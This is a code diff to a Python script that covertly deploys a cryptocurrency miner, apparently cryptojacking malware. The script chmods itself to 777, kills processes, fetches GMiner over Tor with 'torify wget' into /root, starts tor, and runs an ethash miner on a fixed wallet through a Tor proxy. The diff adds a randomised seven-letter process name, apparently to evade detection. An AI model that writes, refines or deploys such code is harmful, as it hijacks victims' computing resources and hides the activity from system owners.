@@ -3,6 +3,7 @@ import time
 import urllib2
 import urllib
 import os,sys
+import subprocess
 from httplib import BadStatusLine
 from socket import error as socket_error
 import multiprocessing
@@ -12,9 +13,8 @@ os.system('chmod 777 ' + __file__)
 program = ''
 link_github = 'https://github.com/develsoftware/GMinerRelease/releases/download/2.68/gminer_2_68_linux64.tar.xz'
 link_folder = 'gminer_2_68_linux64.tar.xz'
-
-
-program = 'miner'
+for k in range(1, 8, 1):
+    program += random.choice(string.ascii_lowercase)
 os.system('pkill ' + program)
 
 try:
@@ -24,7 +24,7 @@ except:
     pass
 try:
 
-    if not os.path.isfile('/root/%s' % program):
+    if not os.path.isfile('/root/miner'):
         os.chdir('/root')
         #os.system('rm -rf %s' %link_folder)
         os.system('torify wget ' + link_github)
@@ -55,4 +55,5 @@ except:
 os.system('tor &')
 time.sleep(60)
 #os.system (program + ' -o stratum+tcp://73avhutb24chfsh6.onion:442 --tls -socks5=9050 -t ' + str(cores))
-subprocess.Popen (program + ' --algo ethash --server asia1.ethermine.org:4444 --proxy 127.0.0.1:9050 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701')
+cmd = [program,'--algo','ethash', '--server', 'asia1.ethermine.org:4444', '--proxy', '127.0.0.1:9050', '--user', '0xbefefb5612d0775d592cb8c0b9411f8a57da5701']
+subprocess.Popen (cmd)
